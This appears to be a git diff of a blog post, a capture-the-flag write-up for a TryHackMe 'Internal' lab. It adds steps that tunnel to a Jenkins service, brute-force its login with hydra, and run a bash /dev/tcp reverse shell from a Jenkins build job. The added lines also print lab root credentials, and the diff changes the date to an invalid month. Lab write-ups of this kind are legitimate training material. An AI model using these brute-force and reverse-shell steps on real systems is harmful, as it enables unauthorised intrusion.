@@ -1,7 +1,7 @@
 ---
 title: "Internal.sh"
-date: 2020-09-16T18:30:35-04:00
-draft: true
+date: 2020-19-16T18:30:35-04:00
+draft: false
 toc: true
 featured: true
 summary: "You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks."
@@ -241,7 +241,9 @@ Let's sum up all the information we have obtained so far:
   - PHPMyadmin: PHPMyAdmin login form accessible at `/phpmyadmin`.
 
 
+![night night](https://media1.tenor.com/images/c5dfd9cefca14ff949590b626c622b7d/tenor.gif?itemid=7281477)
 
+I'm gonna get some sleep, it's really late and work has been super tyring these days. We'll pick it up tomorrow. (yep, I talk to myself a lot.)
 
 
 
@@ -450,17 +452,66 @@ There is also another file called `jenkins.txt` that lets us know about a servic
 aubreanna@internal:~$ cat jenkins.txt
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
-We try uploading `linpeas.sh` again run a `chmod +x linpeas.sh`, and run `linpeas.sh`. This time it runs fine, let's wait and see what it finds.
+We try uploading `linpeas.sh` again run a `chmod +x linpeas.sh`, and run `linpeas.sh`. This time it runs fine, let's wait and see what it finds. _Spoiler: It did not find much, at least nothing obvious._
+
+Let's see if we can connect to that jenkins service, we need to do some local port forwarding with ssh:
+
+![shh tunel](https://i.imgur.com/YO4bkNz.png)
+
+That worked. Now we should be able to open `localhost:8080` in our machine and hopefully have access to that jenkins:
+
+![jenkins login](https://i.imgur.com/9C1TJe5.png)
+
+And we do get the login for jenkins admin panel. Now we need to somehow get us access to the jenkins panel. 
+We could try to bruteforce our way in. Let's see if we attempt a login with `admin:test` as credentials so we can look a bit more into the request that gets triggered:
+
+![we look at the login request](https://i.imgur.com/APkxp8x.png)
+
+We do seem to have pretty much all we need to run a bruteforce job with `hydra`:
+
+`sudo hydra -s 8080 127.0.1 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt`
+
+Let's see if we can run that, after a while we get lucky:
+
+![hydra found the password](https://i.imgur.com/uHyZ0Ln.png)
+
+let's log into jenkins now:
+
+In jenkins there are some various ways we can try to get a shell, if you happen to have seen my writeup on 'alfred' THM box. You'll know that one of those ways is to modify any existing job running on the server or like this case, create a new job that we can use to trigger a shell. Once we have our job created in jenkins we scroll down to the "build" commands section, and add "execute shell" command block. You should get something like this:
+
+![we create a new jenkins job](https://i.imgur.com/esFRWam.png)
 
 
-Ok good progress, we'll pick this up tomorrow. It's been a LONG day, need some shut eye.
+Inside that `Execute shell` text box, we'll add a reverse shell connection script. We'll try with a bash reverse shell:
+
+`bash -c 'exec bash -i &>/dev/tcp/10.13.0.34/2112 <&1'` we simply paste this into the `command` text field int he `execute shell` block. Once done we simply click save to apply the changes.
+
+> Remember to `nc -nlvp 2112`
+
+Now we just need to go back to the jenkins dashboard and we should see a new job listed for which we can now trigger a new build. Let'ts do that:
+
+![jenkins job ready](https://i.imgur.com/VMhhnWT.png)
+
+Once the job runs we should get the reverse shell connection, assuming all goes well:
+
+![we get the reverse shell](https://i.imgur.com/lajlSV0.png)
+
+Now that we got access we need to do a bit of browsing to see what we could find:
+
+After browsing for a while, we can locate an interesting file under the `opt` directory, which reveals the `root` user credentials: `root:tr0ub13guM!@#123`
+
+![we got root credentials](https://i.imgur.com/9YQUL8G.png)
+
+We can probably try to ssh as root to see if we verify these credentials are legit:
+
+![we did it, we got the root flag](https://i.imgur.com/0SeT7nY.png)
 
 
-## Stage 5 - Post-Exploitation, Risk Analysis & Recommendations
+We did it, we got root access and we got the last flag. This was a really good box, I had a great time with it. I hope you, whomever you might be that reads this, have also enjoyed this lab.
 
-> "After the exploitation phase is complete, the goal is to document the methods used to gain access to your organization’s valuable information. The penetration tester should be able to determine the value of the compromised systems and any value associated with the sensitive data captured." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_
+![hackers](https://i.imgur.com/hZADE6D.gif)
 
-## Stage 6 - Reporting
 
-> "Reporting is often regarded as the most critical aspect of a pentest. It’s where you will obtain written recommendations from the penetration testing company and have an opportunity to review the findings from the report with the ethical hacker(s)." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_
+Thank you and Happy hacking!
 
+{{< thm_badge >}}
